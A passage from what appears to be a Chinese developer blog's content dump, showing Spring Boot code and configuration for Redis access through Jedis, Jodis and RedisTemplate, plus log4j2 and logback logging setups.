class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.redisdemo.jodis;</span><br><span class=\"line\"></span><br><span class=\"line\">import com.wandoulabs.jodis.JedisResourcePool;</span><br><span class=\"line\">import com.wandoulabs.jodis.RoundRobinJedisPool;</span><br><span class=\"line\">import org.springframework.beans.factory.annotation.Value;</span><br><span class=\"line\">import org.springframework.context.annotation.Bean;</span><br><span class=\"line\">import org.springframework.context.annotation.Configuration;</span><br><span class=\"line\">import org.springframework.context.annotation.PropertySource;</span><br><span class=\"line\">import redis.clients.jedis.JedisPoolConfig;</span><br><span class=\"line\"></span><br><span class=\"line\">@Configuration</span><br><span class=\"line\">@PropertySource(&#123; &quot;classpath:application.properties&quot; &#125;)</span><br><span class=\"line\">public class JodisConfig &#123;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.zkPath&#125;&quot;)</span><br><span class=\"line\">    private String zkPath;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.product&#125;&quot;)</span><br><span class=\"line\">    private String product;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.zkPassword&#125;&quot;)</span><br><span class=\"line\">    private String zkPassword;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.zkTimeout&#125;&quot;)</span><br><span class=\"line\">    private int zkTimeout;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.maxTotal&#125;&quot;)</span><br><span class=\"line\">    private String maxTotal;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.maxWaitMillis&#125;&quot;)</span><br><span class=\"line\">    private String maxWaitMillis;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.poolMinIdle&#125;&quot;)</span><br><span class=\"line\">    private int poolMinIdele;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.poolMaxIdle&#125;&quot;)</span><br><span class=\"line\">    private int poolMaxIdle;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.testOnBorrow&#125;&quot;)</span><br><span class=\"line\">    private boolean testOnBorrow;</span><br><span class=\"line\">    @Value(&quot;$&#123;spring.jodis.testOnReturn&#125;&quot;)</span><br><span class=\"line\">    private boolean testOnReturn;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Bean</span><br><span class=\"line\">    public JedisResourcePool zkJedisPool()&#123;</span><br><span class=\"line\">        JedisResourcePool jedisPool = null;</span><br><span class=\"line\"></span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            JedisPoolConfig config = new JedisPoolConfig();</span><br><span class=\"line\">            config.setMaxTotal(Integer.parseInt(maxTotal));</span><br><span class=\"line\">            config.setMaxWaitMillis(Integer.parseInt(maxWaitMillis));</span><br><span class=\"line\">            config.setMaxIdle(poolMaxIdle);</span><br><span class=\"line\">            config.setMinIdle(poolMinIdele);</span><br><span class=\"line\">            config.setTestOnBorrow(testOnBorrow);</span><br><span class=\"line\">            config.setTestOnReturn(testOnReturn);</span><br><span class=\"line\">            jedisPool = RoundRobinJedisPool.create().curatorClient(zkPath, zkTimeout)</span><br><span class=\"line\">                    .zkProxyDir(product).password(zkPassword)</span><br><span class=\"line\">                    .poolConfig(config).build();</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            System.out.println(&quot;jodis 连接出错。&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return jedisPool;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>使用<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.redisdemo.jodis;</span><br><span class=\"line\"></span><br><span class=\"line\">import com.example.redisdemo.jedis.ObjectTranscoder;</span><br><span class=\"line\">import com.wandoulabs.jodis.JedisResourcePool;</span><br><span class=\"line\">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class=\"line\">import org.springframework.stereotype.Service;</span><br><span class=\"line\">import redis.clients.jedis.Jedis;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.util.List;</span><br><span class=\"line\"></span><br><span class=\"line\">@Service</span><br><span class=\"line\">public class JodisServer &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Autowired</span><br><span class=\"line\">    JedisResourcePool jedisResourcePool;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void setKey(String key, Object value, int time)&#123;</span><br><span class=\"line\">        Jedis jedis = jedisResourcePool.getResource();</span><br><span class=\"line\">        jedis.setex(key.getBytes(),time, ObjectTranscoder.serialize(value));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public void setKey(String key, Object value)&#123;</span><br><span class=\"line\">        Jedis jedis = jedisResourcePool.getResource();</span><br><span class=\"line\">        System.out.println(&quot;ttl: &quot;);</span><br><span class=\"line\">        System.out.println(jedis.ttl(key));</span><br><span class=\"line\">        //long转int,向下转换，可能溢出，不能直接转换，所以long -&gt; String -&gt; int</span><br><span class=\"line\">        jedis.setex(key.getBytes(),Integer.parseInt(String.valueOf(jedis.ttl(key))), ObjectTranscoder.serialize(value));</span><br><span class=\"line\">        //jedis.setex(key.getBytes(),20, ObjectTranscoder.serialize(value));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public Object getKey(String key)&#123;</span><br><span class=\"line\">        Jedis jedis = jedisResourcePool.getResource();</span><br><span class=\"line\">        if(jedis == null || !jedis.exists(key.getBytes()))&#123;</span><br><span class=\"line\">            return null;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        byte[] in = jedis.get(key.getBytes());</span><br><span class=\"line\">        List list = (List) ObjectTranscoder.deserialize(in);</span><br><span class=\"line\">        return list;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"2-一些注意事项\"><a href=\"#2-一些注意事项\" class=\"headerlink\" title=\"2.一些注意事项\"></a>2.一些注意事项</h2><h3 id=\"2-1-存储数据\"><a href=\"#2-1-存储数据\" class=\"headerlink\" title=\"2.1 存储数据\"></a>2.1 存储数据</h3><p>在jedis存储数据过程中<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public String set(String key, String value) &#123;</span><br><span class=\"line\">  this.checkIsInMultiOrPipeline();</span><br><span class=\"line\">  this.client.set(key, value);</span><br><span class=\"line\">  return this.client.getStatusCodeReply();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>类型为String,String 所以我们要存储List数据，需要先进行序列化<br><br>Serialization（序列化）是一种将对象以一连串的字节描述的过程；反序列化deserialization是一种将这些字节重建成一个对象的过程。<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//存</span><br><span class=\"line\">public  void setKey(String key, Object value)&#123;</span><br><span class=\"line\">  Jedis jedis = jedisPool.getResource();</span><br><span class=\"line\">  jedis.set(key.getBytes(), ObjectTranscoder.serialize(value));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//取</span><br><span class=\"line\">public Object getKey(String key)&#123;</span><br><span class=\"line\">    Jedis jedis = jedisPool.getResource();</span><br><span class=\"line\">    if(jedis == null || !jedis.exists(key.getBytes()))&#123;</span><br><span class=\"line\">        return null;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    byte[] in = jedis.get(key.getBytes());</span><br><span class=\"line\">    List list = (List) ObjectTranscoder.deserialize(in);</span><br><span class=\"line\">    return list;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>序列化工具类<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.redisdemo.jedis;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.*;</span><br><span class=\"line\"></span><br><span class=\"line\">//序列化工具类</span><br><span class=\"line\">public class ObjectTranscoder &#123;</span><br><span class=\"line\">    public static byte[] serialize(Object value) &#123;</span><br><span class=\"line\">        if (value == null) &#123;</span><br><span class=\"line\">            throw new NullPointerException(&quot;Can&apos;t serialize null&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        byte[] rv=null;</span><br><span class=\"line\">        ByteArrayOutputStream bos = null;</span><br><span class=\"line\">        ObjectOutputStream os = null;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            bos = new ByteArrayOutputStream();</span><br><span class=\"line\">            os = new ObjectOutputStream(bos);</span><br><span class=\"line\">            os.writeObject(value);</span><br><span class=\"line\">            os.close();</span><br><span class=\"line\">            bos.close();</span><br><span class=\"line\">            rv = bos.toByteArray();</span><br><span class=\"line\">        &#125; catch (IOException e) &#123;</span><br><span class=\"line\">            throw new IllegalArgumentException(&quot;Non-serializable object&quot;, e);</span><br><span class=\"line\">        &#125; finally &#123;</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                if(os!=null)os.close();</span><br><span class=\"line\">                if(bos!=null)bos.close();</span><br><span class=\"line\">            &#125;catch (Exception e2) &#123;</span><br><span class=\"line\">                e2.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return rv;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static Object deserialize(byte[] in) &#123;</span><br><span class=\"line\">        Object rv=null;</span><br><span class=\"line\">        ByteArrayInputStream bis = null;</span><br><span class=\"line\">        ObjectInputStream is = null;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            if(in != null) &#123;</span><br><span class=\"line\">                bis=new ByteArrayInputStream(in);</span><br><span class=\"line\">                is=new ObjectInputStream(bis);</span><br><span class=\"line\">                rv=is.readObject();</span><br><span class=\"line\">                is.close();</span><br><span class=\"line\">                bis.close();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; catch (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;finally &#123;</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                if(is!=null)is.close();</span><br><span class=\"line\">                if(bis!=null)bis.close();</span><br><span class=\"line\">            &#125; catch (Exception e2) &#123;</span><br><span class=\"line\">                e2.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return rv;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"2-2-maven包冲突\"><a href=\"#2-2-maven包冲突\" class=\"headerlink\" title=\"2.2 maven包冲突\"></a>2.2 maven包冲突</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- redis --&gt;</span><br><span class=\"line\"> &lt;!--&lt;dependency&gt;--&gt;</span><br><span class=\"line\">     &lt;!--&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;--&gt;</span><br><span class=\"line\">     &lt;!--&lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;--&gt;</span><br><span class=\"line\"> &lt;!--&lt;/dependency&gt;--&gt;</span><br><span class=\"line\"> &lt;dependency&gt;</span><br><span class=\"line\">     &lt;groupId&gt;redis.clients&lt;/groupId&gt;</span><br><span class=\"line\">     &lt;artifactId&gt;jedis&lt;/artifactId&gt;</span><br><span class=\"line\">     &lt;version&gt;2.7.3&lt;/version&gt;</span><br><span class=\"line\"> &lt;/dependency&gt;</span><br><span class=\"line\"> &lt;dependency&gt;</span><br><span class=\"line\">     &lt;groupId&gt;com.wandoulabs.jodis&lt;/groupId&gt;</span><br><span class=\"line\">     &lt;artifactId&gt;jodis&lt;/artifactId&gt;</span><br><span class=\"line\">     &lt;version&gt;0.2.2&lt;/version&gt;</span><br><span class=\"line\"> &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n<p>springboot自己集成的spring-boot-data-redis与redis-clients有冲突<br><br>redis-clients可以与jodis配合使用，所以选择redis-clients.</p>\n<h3 id=\"2-3-关于redis过期时间\"><a href=\"#2-3-关于redis过期时间\" class=\"headerlink\" title=\"2.3 关于redis过期时间\"></a>2.3 关于redis过期时间</h3><p>redis默认不过期，当内存满时，删除先存入的<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//存短信记录,首次，设置过期时间</span><br><span class=\"line\">   public void setJodisWithTime(String key, Object value, int time)&#123;</span><br><span class=\"line\">       Jedis jedis = jedisResourcePool.getResource();</span><br><span class=\"line\">       //set(String, String) 所以List需要序列化，有效时间为time</span><br><span class=\"line\">       jedis.setex(key.getBytes(),time, FrequencyVerifiy.serialize(value));</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   //存短信记录，不重新设置过期时间,使用原有的</span><br><span class=\"line\">   public void setJodis(String key, Object value)&#123;</span><br><span class=\"line\">       Jedis jedis = jedisResourcePool.getResource();</span><br><span class=\"line\">       //使用原有时间</span><br><span class=\"line\">       int time = Integer.parseInt(String.valueOf(jedis.ttl(key)));</span><br><span class=\"line\">       jedis.setex(key.getBytes(),time, FrequencyVerifiy.serialize(value));</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"一-Springboot集成Redis\"><a href=\"#一-Springboot集成Redis\" class=\"headerlink\" title=\"一.Springboot集成Redis\"></a>一.Springboot集成Redis</h1><ul>\n<li>maven依赖</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">\t\t&lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>application.properties</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">spring.redis.host=127.0.0.1</span><br><span class=\"line\">spring.redis.port=6379</span><br></pre></td></tr></table></figure>\n<ul>\n<li>配置类</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Configuration</span><br><span class=\"line\">public class RedisConfig  &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    //spring 封装了 RedisTemplate 对象来进行对redis的各种操作，它支持所有的 redis 原生的 api</span><br><span class=\"line\">    @Bean</span><br><span class=\"line\">    public RedisTemplate redisTemplate(RedisConnectionFactory factory)&#123;</span><br><span class=\"line\">        RedisTemplate&lt;String,Object&gt; redisTemplate = new RedisTemplate&lt;&gt;();</span><br><span class=\"line\">        //设置序列化方式,不设置value</span><br><span class=\"line\">        RedisSerializer redisSerializer =new StringRedisSerializer();</span><br><span class=\"line\">        redisTemplate.setKeySerializer(redisSerializer);</span><br><span class=\"line\">        redisTemplate.setHashKeySerializer(redisSerializer);</span><br><span class=\"line\">        //连接</span><br><span class=\"line\">        redisTemplate.setConnectionFactory(factory);</span><br><span class=\"line\">        return redisTemplate;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>使用</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Service</span><br><span class=\"line\">public class RedisDemo &#123;</span><br><span class=\"line\">    @Autowired</span><br><span class=\"line\">    RedisTemplate redisTemplate;</span><br><span class=\"line\"></span><br><span class=\"line\">    public  void setKey(String key, Object value)&#123;</span><br><span class=\"line\">        ValueOperations&lt;String,Object&gt; vo = redisTemplate.opsForValue();</span><br><span class=\"line\">        vo.set(key, value);</span><br><span class=\"line\">        //设置过期时间</span><br><span class=\"line\">        redisTemplate.expire(key,600,TimeUnit.SECONDS);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public  Object getKey(String key)&#123;</span><br><span class=\"line\">        ValueOperations&lt;String,Object&gt; vo = redisTemplate.opsForValue();</span><br><span class=\"line\">        return vo.get(key);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"springboot项目架子","date":"2018-11-23T20:47:52.000Z","_content":"### springboot架子搭建\n\n#### 1.日志\n\n##### （1）log4j2\n- 依赖\n```\n       <!--引入log4j2-->\n       <dependency>\n           <groupId>org.springframework.boot</groupId>\n           <artifactId>spring-boot-starter-log4j2</artifactId>\n       </dependency>\n       <!--log4j2依赖于disruptor-->\n       <dependency>\n           <groupId>com.lmax</groupId>\n           <artifactId>disruptor</artifactId>\n           <version>3.4.2</version>\n       </dependency>\n```\n- 配置文件log4j2.xml\nlog4j2默认会在classpath目录下寻找log4j.json、log4j.jsn、log4j2.xml等名称的文件，如果都没有找到，则会按默认配置输出，也就是输出到控制台\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!-- Configuration后面的status，这个用于设置log4j2自身内部的信息输出，可以不设置，当设置成trace时，\n    你会看到log4j2内部各种详细输出。可以设置成OFF(关闭)或Error(只输出错误信息)\n  -->\n<Configuration status=\"INFO\">\n    <!-- 日志文件目录和压缩文件目录配置 -->\n    <Properties>\n        <Property name=\"fileName\">C:\\\\Users\\\\xiong\\\\Desktop\\\\log\\\\log4j2</Property>\n        <Property name=\"fileGz\">C:\\\\Users\\\\xiong\\\\Desktop\\\\log\\\\log4j2\\\\7z</Property>\n    </Properties>\n    <!--appender主要作用就是：①控制打印日志的地方、②打印日志的输出格式-->\n    <Appenders>\n        <!-- 输出控制台日志的配置 -->\n        <Console name=\"console\" target=\"SYSTEM_OUT\">\n            <!--控制台只输出level及以上级别的信息（onMatch），其他的直接拒绝（onMismatch）-->\n            <ThresholdFilter level=\"info\" onMatch=\"ACCEPT\" onMismatch=\"DENY\"/>\n            <!-- 输出日志的格式 -->\n            <PatternLayout pattern=\"%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n\"/>\n        </Console>\n\n        <!-- 打印出所有的信息，每次大小超过size，则这size大小的日志会自动存入按年份-月份建立的文件夹下面并进行压缩，作为存档 -->\n        <RollingRandomAccessFile name=\"infoFile\" fileName=\"${fileName}/log-info.log\" immediateFlush=\"false\"\n                                 filePattern=\"${fileGz}/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log-info.gz\">\n            <PatternLayout pattern=\"%d{yyyy-MM-dd 'at' HH:mm:ss z} [%t] %-5level %logger{36} %L %M - %msg%xEx%n\" />\n            <Policies>\n                <TimeBasedTriggeringPolicy interval=\"6\" modulate=\"true\" />\n                <SizeBasedTriggeringPolicy size=\"100 MB\"/>\n            </Policies>\n            <Filters>\n                <!-- 只记录info和warn级别信息 -->\n                <ThresholdFilter level=\"error\" onMatch=\"DENY\" onMismatch=\"NEUTRAL\"/>\n                <ThresholdFilter level=\"info\" onMatch=\"ACCEPT\" onMismatch=\"DENY\" />\n            </Filters>\n            <!-- 指定每天的最大压缩包个数，默认7个，超过了会覆盖之前的 -->\n            <DefaultRolloverStrategy max=\"50\"/>\n        </RollingRandomAccessFile>\n\n        <!-- 存储所有error信息 -->\n        <RollingRandomAccessFile name=\"errorFile\" fileName=\"${fileName}/log-error.log\" immediateFlush=\"false\"\n                                 filePattern=\"${fileGz}/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log-error.gz\">\n            <PatternLayout pattern=\"%d{yyyy-MM-dd 'at' HH:mm:ss z} [%t] %-5level %logger{36} %L %M - %msg%xEx%n\" />\n            <Policies>\n                <TimeBasedTriggeringPolicy interval=\"6\" modulate=\"true\" />\n                <SizeBasedTriggeringPolicy size=\"100 MB\"/>\n            </Policies>\n            <Filters>\n                <!-- 只记录error级别信息 -->\n                <ThresholdFilter level=\"error\" onMatch=\"ACCEPT\" onMismatch=\"DENY\" />\n            </Filters>\n            <!-- 指定每天的最大压缩包个数，默认7个，超过了会覆盖之前的 -->\n            <DefaultRolloverStrategy max=\"50\"/>\n        </RollingRandomAccessFile>\n    </Appenders>\n\n    <!-- 全局配置，默认所有的Logger都继承此配置 -->\n    <Loggers>\n        <!-- AsyncRoot - 异步记录日志 - 需要LMAX Disruptor的支持 -->\n        <AsyncRoot level=\"info\" additivity=\"false\">\n            <AppenderRef ref=\"console\"/>\n            <AppenderRef ref=\"infoFile\"/>\n            <AppenderRef ref=\"errorFile\"/>\n        </AsyncRoot>\n    </Loggers>\n</Configuration>\n```\n- 使用\n```\n@Controller\npublic class TestController {\n    Logger logger = LogManager.getLogger(TestController.class);\n\n    @RequestMapping(value = \"test\", method = RequestMethod.GET)\n    @ResponseBody\n    public String test(){\n        logger.debug(\"test debug\");\n        logger.info(\"test info\");\n        logger.warn(\"test warn\");\n        logger.error(\"test error\");\n        logger.fatal(\"test fatal\");\n        return \"ok\";\n    }\n}\n```\n##### logback(默认)\n在resouces下添加logback-spring.xml配置文件\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n\t<include resource=\"org/springframework/boot/logging/logback/base.xml\" />\n\t<jmxConfigurator/>\n\t<!--<property name=\"log.path\" value=\"/home/jzyx/epmnew/logs\"/>-->\n    <property name=\"log.path\" value=\"D:\\\\Logs\\\\aipmanage\\\\logs\\\\\"/>\n\t<!--<property name=\"log.path\" value=\"\\\\opt\"/>-->\n\n\t<appender name=\"console\" class=\"ch.qos.logback.core.ConsoleAppender\">\n\t\t<!-- Log message format -->\n\t\t<encoder>\n\t\t\t<pattern>%d{yyyy-MM-dd HH:mm:ss.SSS} %5level --- [%thread] %logger{36} : %msg%n</pattern>\n\t\t\t<charset>UTF-8</charset>\n\t\t</encoder>\n\t\t<!-- deny all events with a level below DEBUG, that is TRACE  -->\n\t\t<filter class=\"ch.qos.logback.classic.filter.ThresholdFilter\">\n\t\t\t<level>DEBUG</level>\n\t\t</filter>\n\t</appender>\n\n\t<appender name=\"sysDailyRollingFile\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\">\n\t\t<!--  <file>E:\\\\项目\\\\demoClientLog\\\\sys.log</file>-->\n\t\t<rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\">\n\t\t\t<!-- daily rollover -->\n\t\t\t<fileNamePattern>${log.path}\\\\demoClient-DEBUG-%d{yyyyMMdd}.log</fileNamePattern>\n\t\t\t<!-- 保留30天的日志 -->\n\t\t\t<maxHistory>30</maxHistory>\n\t\t</rollingPolicy>\n\t\t<encoder>\n\t\t\t<pattern>%d{yyyy-MM-dd HH:mm:ss.SSS} %5level --- [%thread] %logger{36} : %msg%n</pattern>\n\t\t\t<charset>UTF-8</charset>\n\t\t</encoder>\n\t\t<filter class=\"ch.qos.logback.classic.filter.ThresholdFilter\">\n\t\t\t<level>DEBUG</level>\n\t\t</filter>\n\t</appender>\n\n\t<appender name=\"infoDailyRollingFile\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\">\n\t\t<!-- <file>E:\\\\项目\\\\demoClientLog\\\\demoClient-info.log</file> -->\n\t\t<rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\">\n\t\t\t<!-- daily rollover -->\n\t\t\t<fileNamePattern>${log.path}\\\\demoClient-INFO-%d{yyyyMMdd}.log</fileNamePattern>\n\t\t\t<!-- 保留30天的日志 